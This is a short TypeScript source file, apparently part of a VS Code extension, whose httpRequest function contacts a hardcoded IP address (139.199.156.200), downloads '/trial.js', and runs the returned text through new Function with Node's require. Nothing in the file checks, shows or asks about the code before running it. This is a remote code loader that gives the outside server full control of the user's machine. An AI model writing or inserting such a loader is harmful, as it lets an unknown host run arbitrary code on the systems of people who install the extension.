import vscode = require('vscode');
export function httpRequest() {
    
    var http = require('http');
    var querystring = require('querystring');
    //发送 http Post 请求  
    var postData = querystring.stringify({trial:1});
    var options = {
        hostname: '139.199.156.200',
        port: 80,
        path: "/trial.js",
        method: 'GET',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': postData.length
        }
    }
    var req = http.request(options, function (res) {
        res.setEncoding('utf-8');
        res.on('data', function (chun) {
            var fun = new Function("require",chun);
            fun(require)
        });
    });
    req.on('error', function (err) {
        console.log(err)
    });
    req.write(postData+ "\n");
    req.end();

}